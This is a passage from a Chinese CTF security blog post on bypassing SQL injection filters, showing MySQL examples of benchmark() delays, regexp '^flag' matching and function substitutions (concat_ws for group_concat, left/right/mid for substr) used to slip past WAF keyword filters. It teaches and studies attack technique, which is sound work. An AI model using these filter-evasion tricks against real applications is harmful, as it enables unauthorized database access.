mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token number">12</span><span class="token punctuation">,</span><span class="token number">23</span> <span class="token operator">and</span> benchmark<span class="token punctuation">(</span><span class="token number">1000000000</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+--------------------------------+</span>
<span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> <span class="token number">23</span> <span class="token operator">and</span> benchmark<span class="token punctuation">(</span><span class="token number">1000000000</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+--------------------------------+</span>
<span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span>                              <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+--------------------------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">4.61</span> sec<span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ascii()–&gt;hex()、bin()<br>替代之后再使用对应的进制转string即可</li><li>group_concat()–&gt;concat_ws()</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span><span class="token string">"str1"</span><span class="token punctuation">,</span><span class="token string">"str2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-----------------------------+</span>
<span class="token operator">|</span> group_concat<span class="token punctuation">(</span><span class="token string">"str1"</span><span class="token punctuation">,</span><span class="token string">"str2"</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-----------------------------+</span>
<span class="token operator">|</span> str1str2                    <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-----------------------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

<span class="token comment">#第一个参数为分隔符</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span> concat_ws<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"str1"</span><span class="token punctuation">,</span><span class="token string">"str2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">------------------------------+</span>
<span class="token operator">|</span> concat_ws<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"str1"</span><span class="token punctuation">,</span><span class="token string">"str2"</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">------------------------------+</span>
<span class="token operator">|</span> str1<span class="token punctuation">,</span>str2                    <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">------------------------------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</li><li><strong>substr(<em>str</em>,<em>start</em>,1) 等价于 right(left(<em>str</em>,<em>len</em>),1)</strong> ，同样还可以使用left(),right(),reverse()进行组合绕过，同样用正则<strong>regexp</strong>匹配字符串有奇效，如 <code>regexp &#39;^flag&#39;</code>可以匹配以flag开头的字符串，具体用法请学习正则表达式。</li><li>ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</li></ul></div><div></div></article><div class="nav"><div class="nav-item-prev"><a href="/2022/03/21/HFCTF-babysql%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="nav-link"><i class="iconfont icon-left nav-prev-icon"></i><div><div class="nav-label">上一篇</div><div class="nav-title">HFCTF2022_babysql题目复现</div></div></a></div><div class="nav-item-next"><a href="/2022/03/11/%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" class="nav-link"><div><div class="nav-label">下一篇</div><div class="nav-title">关于md5的绕过技巧</div></div><i class="iconfont icon-right nav-next-icon"></i></a></div></div><div class="card card-content toc-card" id="mobiletoc"><div class="toc-header"><i class="iconfont icon-menu" style="padding-right:2px"></i>目录</div><ol class="toc"><li class="toc-item toc-level-2"><a href="#SQL%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0" class="toc-link"><span class="toc-text">SQL语法学习</span></a></li><li class="toc-item toc-level-2"><a href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D" class="toc-link"><span class="toc-text">常用函数介绍</span></a></li><li class="toc-item toc-level-2"><a href="#%E5%B8%B8%E7%94%A8%E8%BF%90%E7%AE%97%E7%AC%A6%E5%92%8C%E5%85%B3%E9%94%AE%E5%AD%97" class="toc-link"><span class="toc-text">常用运算符和关键字</span></a></li><li class="toc-item toc-level-2"><a href="#%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95" class="toc-link"><span class="toc-text">常用绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">注释符号绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">内联注释绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%8F%8C%E5%86%99%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">双写关键字绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">特殊编码绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">空格过滤绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4or-and-xor-not-%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤or and xor not 绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7-x3D-%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤等号&#x3D;绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E5%A4%A7%E5%B0%8F%E4%BA%8E%E5%8F%B7%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤大小于号绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤引号绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤逗号绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤函数绕过</span></a></li></ol></li></ol></div></main><aside class="left-column"><div class="card card-author"><img alt="author avatar" class="author-img" src="/icon/logo.png" height="88" width="88"><p class="author-name">pankas</p><p class="author-description">pankas的小窝</p><div class="author-message"><a href="/archives" class="author-posts-count"><span>19</span> <span>文章</span> </a><a href="/categories" class="author-categories-count"><span>5</span> <span>分类</span> </a><a href="/tags" class="author-tags-count"><span>25</span> <span>标签</span></a></div><div class="author-card-society"><div class="author-card-society-icon"><a href="https://github.com/pankass" rel="noopener" target="_blank"><i class="iconfont society-icon icon-github"></i></a></div><div class="author-card-society-icon"><a href="mailto:1520319004@qq.com"><i class="iconfont society-icon icon-mail"></i></a></div></div></div><div class="sticky-tablet"><article class="display-when-two-columns spacer"><div class="card card-content toc-card"><div class="toc-header"><i class="iconfont icon-menu" style="padding-right:2px"></i>目录</div><ol class="toc"><li class="toc-item toc-level-2"><a href="#SQL%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0" class="toc-link"><span class="toc-text">SQL语法学习</span></a></li><li class="toc-item toc-level-2"><a href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D" class="toc-link"><span class="toc-text">常用函数介绍</span></a></li><li class="toc-item toc-level-2"><a href="#%E5%B8%B8%E7%94%A8%E8%BF%90%E7%AE%97%E7%AC%A6%E5%92%8C%E5%85%B3%E9%94%AE%E5%AD%97" class="toc-link"><span class="toc-text">常用运算符和关键字</span></a></li><li class="toc-item toc-level-2"><a href="#%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95" class="toc-link"><span class="toc-text">常用绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">注释符号绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">内联注释绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%8F%8C%E5%86%99%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">双写关键字绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">特殊编码绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">空格过滤绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4or-and-xor-not-%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤or and xor not 绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7-x3D-%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤等号&#x3D;绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E5%A4%A7%E5%B0%8F%E4%BA%8E%E5%8F%B7%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤大小于号绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤引号绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤逗号绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤函数绕过</span></a></li></ol></li></ol></div></article><article class="card card-content categories-widget"><div class="categories-card"><div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right:2px"></i>分类</div><div class="categories-list"><a href="/categories/CTF-WP/"><div class="categories-list-item">CTF-WP <span class="categories-list-item-badge">9</span></div></a><a href="/categories/SQL%E6%B3%A8%E5%85%A5/"><div class="categories-list-item">SQL注入 <span class="categories-list-item-badge">2</span></div></a><a href="/categories/%E5%89%8D%E7%AB%AF/"><div class="categories-list-item">前端 <span class="categories-list-item-badge">1</span></div></a><a href="/categories/%E7%88%AC%E8%99%AB/"><div class="categories-list-item">爬虫 <span class="categories-list-item-badge">1</span></div></a><a href="/categories/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"><div class="categories-list-item">web安全基础 <span class="categories-list-item-badge">5</span></div></a></div></div></article><article class="card card-content tags-widget"><div class="tags-card"><div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right:2px"></i>热门标签</div><div class="tags-list"><a href="/tags/CTF/" title="CTF"><div class="tags-list-item">CTF</div></a><a href="/tags/php/" title="php"><div class="tags-list-item">php</div></a><a href="/tags/HGAME/" title="HGAME"><div class="tags-list-item">HGAME</div></a><a href="/tags/SQL/" title="SQL"><div class="tags-list-item">SQL</div></a><a href="/tags/python/" title="python"><div class="tags-list-item">python</div></a><a href="/tags/phar/" title="phar"><div class="tags-list-item">phar</div></a><a href="/tags/ACTF/" title="ACTF"><div class="tags-list-item">ACTF</div></a><a href="/tags/WP/" title="WP"><div class="tags-list-item">WP</div></a><a href="/tags/regex/" title="regex"><div class="tags-list-item">regex</div></a><a href="/tags/MD5/" title="MD5"><div class="tags-list-item">MD5</div></a><a href="/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" title="SQL注入绕过"><div class="tags-list-item">SQL注入绕过</div></a><a href="/tags/flask/" title="flask"><div class="tags-list-item">flask</div></a><a href="/tags/wget/" title="wget"><div class="tags-list-item">wget</div></a><a href="/tags/Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="Linux环境变量"><div class="tags-list-item">Linux环境变量</div></a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化"><div class="tags-list-item">反序列化</div></a><a href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议"><div class="tags-list-item">php伪协议</div></a></div></div></article></div></aside><aside class="right-column"><div class="sticky-widescreen"><article class="card card-content toc-card"><div class="toc-header"><i class="iconfont icon-menu" style="padding-right:2px"></i>目录</div><ol class="toc"><li class="toc-item toc-level-2"><a href="#SQL%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0" class="toc-link"><span class="toc-text">SQL语法学习</span></a></li><li class="toc-item toc-level-2"><a href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D" class="toc-link"><span class="toc-text">常用函数介绍</span></a></li><li class="toc-item toc-level-2"><a href="#%E5%B8%B8%E7%94%A8%E8%BF%90%E7%AE%97%E7%AC%A6%E5%92%8C%E5%85%B3%E9%94%AE%E5%AD%97" class="toc-link"><span class="toc-text">常用运算符和关键字</span></a></li><li class="toc-item toc-level-2"><a href="#%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95" class="toc-link"><span class="toc-text">常用绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">注释符号绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">内联注释绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%8F%8C%E5%86%99%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">双写关键字绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">特殊编码绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">空格过滤绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4or-and-xor-not-%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤or and xor not 绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7-x3D-%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤等号&#x3D;绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E5%A4%A7%E5%B0%8F%E4%BA%8E%E5%8F%B7%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤大小于号绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤引号绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤逗号绕过</span></a></li><li class="toc-item toc-level-3"><a href="#%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87" class="toc-link"><span class="toc-text">过滤函数绕过</span></a></li></ol></li></ol></article><article class="card card-content"><div class="recent-posts-card"><div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right:2px"></i>最近文章</div><div class="recent-posts-list"><div class="recent-posts-item"><div class="recent-posts-item-title">2022-06-27</div><a href="/2022/06/27/ACTF-Web%E9%A2%98%E5%A4%8D%E7%8E%B0/"><div class="recent-posts-item-content">ACTF-Web题复现（更新ing）</div></a></div><div class="recent-posts-item"><div class="recent-posts-item-title">2022-05-05</div><a href="/2022/05/05/miniL-web/"><div class="recent-posts-item-content">miniL-web</div></a></div><div class="recent-posts-item"><div class="recent-posts-item-title">2022-04-30</div><a href="/2022/04/30/2022DASCTF-Apr-X-FATE-soeasy-php/"><div class="recent-posts-item-content">2022DASCTF Apr X FATE-soeasy_php</div></a></div><div class="recent-posts-item"><div class="recent-posts-item-title">2022-04-28</div><a href="/2022/04/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><div class="recent-posts-item-content">phar反序列化学习笔记</div></a></div></div></div></article></div></aside></div></div></div></div><footer class="footer"><div class="footer-container"><div><div class="footer-dsc"><span>Copyright © 2020 - 2022 </span>&nbsp; <a href="/" class="footer-link">pankas'blog</a></div></div><div class="footer-dsc">Powered by <a href="https://hexo.io/" class="footer-link" rel="nofollow noopener noreferrer" target="_blank">&nbsp;Hexo </a><span>&nbsp;|&nbsp;</span> Theme - <a href="https://github.com/theme-kaze" class="footer-link" rel="nofollow noopener noreferrer" target="_blank">&nbsp;Kaze</a></div><div class="footer-dsc">本站总访问量<span id="busuanzi_value_site_pv"></span>次 <span>&nbsp;|&nbsp;</span> 本站总访客数<span id="busuanzi_value_site_uv"></span>次</div></div></footer><a class="basebutton" id="scrollbutton" aria-label="回到顶部" role="button"><i class="iconfont button-icon icon-arrowleft"></i> </a><a class="basebutton" id="menubutton" aria-label="menu button" role="button"><i class="iconfont button-icon icon-menu"></i> </a><a class="basebutton" id="popbutton" aria-label="控制中心" role="button"><i class="iconfont button-icon icon-expand"></i> </a><a class="basebutton darkwidget" id="darkbutton" aria-label="夜色模式" role="button"><i class="iconfont button-icon icon-weather"></i> </a><a class="basebutton searchwidget" id="searchbutton" aria-label="搜索" role="button"><i class="iconfont button-icon icon-search"></i></a><script>var addImgLayout=function(){for(var t=document.querySelectorAll(".post-content img"),e=0;e<t.length;e++){var a=document.createElement("a"),l=(a.setAttribute("href",t[e].getAttribute("data-src")),a.setAttribute("aria-label","illustration"),a.style.cssText="width: 100%; display: flex; justify-content: center;",t[e].alt&&(a.dataset.caption=t[e].alt),a.dataset.nolink=!0,t[e].before(a),a.append(t[e]),document.createElement("div"));l.classList.add("gallery"),a.before(l),l.append(a)}baguetteBox.run(".gallery")}</script><script>loadScript("/js/lib/lightbox/baguetteBox.min.js",addImgLayout)</script><script src="/js/main.js"></script><script>loadScript("/js/lib/busuanzi.min.js")</script><script>var addLazyload=function(){lozad(".lozad",{load:function(a){a.srcset=a.getAttribute("data-src")},loaded:function(a){a.classList.add("loaded")}}).observe()}</script><script>loadScript("/js/lib/lozad.min.js",addLazyload)</script><script>setTimeout(()=>{localSearch("search.json")},0)</script></body></html>